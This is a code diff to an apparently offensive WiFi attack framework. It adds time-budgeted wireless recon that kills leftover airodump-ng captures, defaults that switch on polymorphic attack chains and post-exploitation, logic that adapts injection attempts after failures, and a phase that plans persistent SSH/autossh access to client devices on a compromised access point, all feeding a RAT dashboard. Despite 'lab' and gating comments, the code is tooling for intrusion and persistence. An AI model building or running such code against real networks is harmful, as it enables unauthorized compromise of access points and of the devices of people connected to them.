@@ -583,8 +583,12 @@ class AdaptiveEngagement:
                 cyc["access"] = True
                 self.log("[+] ACCESS ACHIEVED — post-exploit + RAT dashboard")
 
-                # 8) Auto post-exploitation already inside orch hooks;
-                # ensure gain hooks ran (orchestrator.run already did).
+                # 8) WiFi: plan sticky post-exploit toward associated clients
+                if domain == "wifi":
+                    clients_out = self._phase_wifi_client_post(seed, attack_out)
+                    cyc["phases"]["wifi_client_post"] = clients_out
+                    report["wifi_client_post"] = clients_out
+
                 # 9) RAT / flash dashboard
                 rat = self._phase_rat(domain, seed, attack_out)
                 cyc["phases"]["rat"] = rat
@@ -654,28 +658,146 @@ class AdaptiveEngagement:
             return {"ok": False, "error": "catalog_recon_factory not wired"}
         recon = self.catalog_recon_factory(seed)
 
-        def _call_run():
-            try:
-                return recon.run(with_probes=True)
-            except TypeError:
-                return recon.run()
+        # External scan already filled identity (ssid/bssid/enc/channel) —
+        # run a *lean* pass (6 core steps) first so AIO does not freeze the
+        # TUI for minutes of silent airodump/handshake probes. Deep cycle
+        # can expand later within budget.
+        has_identity = bool(
+            seed.get("bssid") and (seed.get("ssid") or seed.get("encryption")
+                                   or seed.get("enc") or seed.get("channel"))
+        )
+        lean = bool(seed.get("aio") or seed.get("from_external_scan")
+                    or has_identity) and not deep
 
-        report = _call_run()
+        # Wall-clock budget so recon never freezes adaptive forever.
+        # Default 75s lean / 120s full; override with KFIOSA_RECON_BUDGET_S.
+        try:
+            env_b = os.environ.get("KFIOSA_RECON_BUDGET_S", "").strip()
+            budget = float(env_b) if env_b else (75.0 if lean else 120.0)
+        except ValueError:
+            budget = 75.0 if lean else 120.0
+        if deep:
+            budget = min(budget, 90.0)
+
+        # Best-effort: free the radio if a stale airodump still holds it
+        # (common after external live scan window).
+        try:
+            self._kill_stale_airodump(seed.get("interface") or seed.get("iface"))
+        except Exception:  # noqa: BLE001
+            pass
+
+        def _on_step(name: str, event: str) -> None:
+            if event == "start":
+                self.log(f"[recon] ▶ {name}…")
+            elif event == "done":
+                st = {}
+                try:
+                    st = _safe_dict(getattr(recon, "recon", {}).get(name))
+                except Exception:
+                    st = {}
+                ok = st.get("ok")
+                err = (st.get("error") or "")[:80]
+                if ok:
+                    self.log(f"[recon] ✓ {name}")
+                else:
+                    self.log(f"[recon] · {name} ok=False {err}")
+            elif event == "skip":
+                self.log(f"[recon] ⏭ {name} (budget)")
+            elif event == "error":
+                self.log(f"[recon] ! {name} raised")
+
+        def _call_run(*, with_probes: bool, lean_mode: bool):
+            try:
+                return recon.run(
+                    with_probes=with_probes,
+                    budget_s=budget,
+                    on_step=_on_step,
+                    lean=lean_mode,
+                )
+            except TypeError:
+                # Older CatalogRecon without budget/on_step kwargs
+                try:
+                    return recon.run(with_probes=with_probes and not lean_mode)
+                except TypeError:
+                    return recon.run()
+
+        self.log(
+            f"[recon] wifi lean={lean} deep={deep} budget={budget:.0f}s "
+            f"iface={seed.get('interface') or seed.get('iface') or '?'}"
+        )
+        t0 = time.time()
+        report = _call_run(with_probes=not lean, lean_mode=lean)
         # Merge into seed (cycle-safe, no backrefs)
         self._merge_wifi_recon(seed, report)
         if deep and hasattr(recon, "run_probe"):
+            remaining = budget - (time.time() - t0)
             for m in ("signal_map", "channel_plan", "beacon_parse"):
+                if remaining <= 3:
+                    self.log(f"[recon] ⏭ deep {m} (budget)")
+                    break
                 try:
+                    self.log(f"[recon] ▶ deep:{m}…")
                     recon.run_probe(m)
                 except Exception:  # noqa: BLE001
                     pass
-            # Refresh merge after deep probes
+                remaining = budget - (time.time() - t0)
+            # Refresh merge after deep probes (no full re-run — that was
+            # doubling airodump time and freezing AIO).
             try:
-                report = _call_run()
-                self._merge_wifi_recon(seed, report)
+                self._merge_wifi_recon(seed, getattr(recon, "recon", report))
             except Exception:  # noqa: BLE001
                 pass
-        return {"ok": True, "recon_keys": list(_safe_dict(report).keys())[:20]}
+        elapsed = round(time.time() - t0, 1)
+        keys = list(_safe_dict(report).keys())[:20]
+        self.log(
+            f"[recon] wifi done in {elapsed}s "
+            f"budget_hit={bool(_safe_dict(report).get('budget_hit'))} "
+            f"steps_ran={_safe_dict(report).get('steps_ran', '?')}"
+        )
+        return {
+            "ok": True,
+            "recon_keys": keys,
+            "duration_s": elapsed,
+            "lean": lean,
+            "budget_s": budget,
+            "budget_hit": bool(_safe_dict(report).get("budget_hit")),
+        }
+
+    @staticmethod
+    def _kill_stale_airodump(iface: Optional[str] = None) -> None:
+        """Best-effort: terminate leftover airodump-ng that holds the radio.
+
+        External live scan windows sometimes leave airodump attached to
+        the monitor vif; concurrent recon airodumps then hang or return
+        empty. Never raises.
+        """
+        import signal
+        import subprocess as sp
+        try:
+            p = sp.run(
+                ["pgrep", "-a", "airodump-ng"],
+                capture_output=True, text=True, timeout=3,
+            )
+        except Exception:
+            return
+        for line in (p.stdout or "").splitlines():
+            parts = line.strip().split(None, 1)
+            if not parts:
+                continue
+            try:
+                pid = int(parts[0])
+            except ValueError:
+                continue
+            cmdline = parts[1] if len(parts) > 1 else ""
+            if iface and iface not in cmdline:
+                continue
+            # Only kill captures we own (kfiosa prefixes) or matching iface
+            if "kfiosa" not in cmdline and not (iface and iface in cmdline):
+                continue
+            try:
+                os.kill(pid, signal.SIGTERM)
+            except Exception:
+                pass
 
     def _merge_wifi_recon(self, seed: Dict[str, Any], recon_report: Any) -> None:
         if not isinstance(recon_report, dict):
@@ -1036,6 +1158,11 @@ class AdaptiveEngagement:
             except Exception:  # noqa: BLE001
                 pass
 
+        # Ensure AI chain + post-exploit tails are preferred for simplified TUI
+        seed.setdefault("use_ai_chain", True)
+        seed.setdefault("attach_post_exploit", True)
+        seed.setdefault("polymorphic", True)
+
         steps: List[Dict[str, Any]] = []
         source = "legacy"
         if getattr(orch, "chain_planner", None) is not None:
@@ -1061,6 +1188,52 @@ class AdaptiveEngagement:
 
         # Inject polymorphic / target-adaptive mutations
         steps = _poly_mutate_steps(steps, seed, domain, cycle)
+        # Fully offensive inject → PE/privesc live merge for WiFi
+        if domain in ("wifi", "wlan"):
+            try:
+                from core.poly.offensive_inject import (
+                    merge_offensive_prefix,
+                    react_inject,
+                )
+                last_res = None
+                for ent in reversed(report.get("executed") or []):
+                    if isinstance(ent, dict) and (
+                        "inject" in str(ent.get("action") or "").lower()
+                        or (ent.get("result") or {}).get("mode")
+                    ):
+                        last_res = ent.get("result") or ent
+                        break
+                # Also use prior cycle failures stored on seed
+                if seed.get("last_inject_result"):
+                    last_res = seed.get("last_inject_result")
+                steps = merge_offensive_prefix(
+                    steps, seed, last_result=last_res,
+                )
+                if last_res and (
+                    last_res.get("ok") is False
+                    or seed.get("access", {}).get("achieved")
+                    or (report.get("access") or {}).get("achieved")
+                ):
+                    reaction = react_inject(
+                        seed, last_res,
+                        history_modes=seed.get("inject_mode_history") or [],
+                    )
+                    report["inject_live_adapt"] = {
+                        "phase": reaction.get("phase"),
+                        "narrative": reaction.get("narrative"),
+                        "mode": (reaction.get("pick") or {}).get("mode")
+                        or (reaction.get("pick") or {}).get("method"),
+                    }
+                    self.log(
+                        reaction.get("narrative")
+                        or f"[poly] offensive inject adapt phase={reaction.get('phase')}"
+                    )
+                    if reaction.get("phase") == "inject_retry" and reaction.get("chain"):
+                        steps = reaction["chain"]
+                seed.setdefault("offensive_inject", True)
+                seed.setdefault("attach_post_exploit", True)
+            except Exception as e:  # noqa: BLE001
+                self.log(f"[i] offensive inject merge skipped: {e}")
         report["ai_chain"] = steps
         report["poly_cycle"] = cycle
         self.log(
@@ -1083,6 +1256,148 @@ class AdaptiveEngagement:
             domain, seed, report, autonomous=autonomous,
         )
         return report
+
+    def _phase_wifi_client_post(
+        self, seed: Dict[str, Any], orch_report: Dict[str, Any]
+    ) -> Dict[str, Any]:
+        """After AP foothold: plan polymorphic sticky access to clients.
+
+        Never fabricates clients — only uses MACs/hosts already in seed/
+        recon. Plans via post_exploit runner when present; always stamps
+        session roster entries for the Flask dashboard.
+        """
+        self.log("[*] Phase post-exploit → WiFi associated clients (poly sticky)")
+        clients: List[Any] = []
+        for src in (
+            seed.get("clients"),
+            _safe_dict(seed.get("recon")).get("clients"),
+            seed.get("stations"),
+        ):
+            if isinstance(src, list) and src:
+                clients = list(src)
+                break
+            if isinstance(src, dict):
+                data = src.get("data") or src.get("stations") or src.get("clients")
+                if isinstance(data, list) and data:
+                    clients = list(data)
+                    break
+        # Also pull from attack report seed mutation
+        if not clients:
+            for ent in (orch_report.get("executed") or []):
+                res = _safe_dict(_safe_dict(ent).get("result")).get("data") or {}
+                if isinstance(res.get("clients"), list):
+                    clients = list(res["clients"])
+                    break
+
+        out: Dict[str, Any] = {
+            "ok": True,
+            "client_count": len(clients),
+            "planned": [],
+            "note": "real clients only; ACCEPT-gated execute later",
+        }
+        if not clients:
+            self.log("[i] no associated clients in recon — skip client post-plan")
+            out["ok"] = False
+            out["error"] = "no clients discovered"
+            return out
+
+        runner = None
+        if self.orch is not None:
+            runner = getattr(self.orch, "post_exploit_runner", None) or getattr(
+                self.orch, "msf_runner", None
+            )
+
+        # Polymorphic keep-alive strategies (lab / real tools only)
+        poly_tips = [
+            "ssh -o ServerAliveInterval=30 -o ServerAliveCountMax=3",
+            "tmux new -A -s kfiosa-lab",
+            "autossh -M 0 -f -N",
+            "lab reverse stub after real foothold (never invent shells)",
+        ]
+        try:
+            from core.utils.poly_adapt import situational_pick
+            pick = situational_pick(
+                ["ssh_keepalive", "tmux_session", "autossh", "lab_beacon"],
+                {"context": "wifi_client_post", "host_os": "kali"},
+            )
+            out["poly_pick"] = pick
+        except Exception:  # noqa: BLE001
+            out["poly_pick"] = poly_tips[0]
+
+        # Gated sticky-helper steps for the operator/Flask (not auto-run)
+        out["sticky_steps"] = [
+            {
+                "action": "external_terminal",
+                "tool": "ssh",
+                "risk_level": "destructive",
+                "gated": True,
+                "optional": True,
+                "args": {
+                    "title": "sticky-ssh",
+                    "cmd_hint": poly_tips[0],
+                    "why": "polymorphic sticky SSH keep-alive to client host",
+                },
+            },
+            {
+                "action": "external_terminal",
+                "tool": "tmux",
+                "risk_level": "read",
+                "gated": True,
+                "optional": True,
+                "args": {
+                    "title": "sticky-tmux",
+                    "cmd_hint": poly_tips[1],
+                    "why": "reattachable lab session on Kali host",
+                },
+            },
+        ]
+        seed["sticky_connection_steps"] = out["sticky_steps"]
+
+        planned: List[Dict[str, Any]] = []
+        for i, c in enumerate(clients[:12]):
+            if isinstance(c, dict):
+                mac = c.get("mac") or c.get("station") or c.get("bssid") or c.get("addr")
+                ip = c.get("ip") or c.get("ipv4")
+            else:
+                mac, ip = str(c), None
+            entry = {
+                "index": i,
+                "mac": mac,
+                "ip": ip,
+                "poly": out.get("poly_pick"),
+                "keepalive": poly_tips,
+            }
+            if runner is not None and hasattr(runner, "plan"):
+                try:
+                    plan = runner.plan({
+                        "domain": "post_exploit",
+                        "from_wifi": True,
+                        "client_mac": mac,
+                        "client_ip": ip,
+                        "bssid": seed.get("bssid"),
+                        "ssid": seed.get("ssid"),
+                        "polymorphic": True,
+                        "sticky_connection": True,
+                        "access": orch_report.get("access"),
+                    })
+                    entry["plan_ok"] = True
+                    entry["plan_keys"] = list((plan or {}).keys())[:8]
+                except Exception as e:  # noqa: BLE001
+                    entry["plan_ok"] = False
+                    entry["error"] = str(e)[:120]
+            planned.append(entry)
+            self.log(
+                f"[post] client {i + 1}/{min(12, len(clients))}: "
+                f"mac={mac or '?'} ip={ip or '?'} poly={out.get('poly_pick')}"
+            )
+
+        out["planned"] = planned
+        seed["client_post_plans"] = planned
+        # Surface clients on seed for Flask RAT wifi session
+        seed.setdefault("dashboard_clients", [
+            {"mac": p.get("mac"), "ip": p.get("ip")} for p in planned
+        ])
+        return out
 
     def _phase_rat(
         self, domain: str, seed: Dict[str, Any], orch_report: Dict[str, Any]
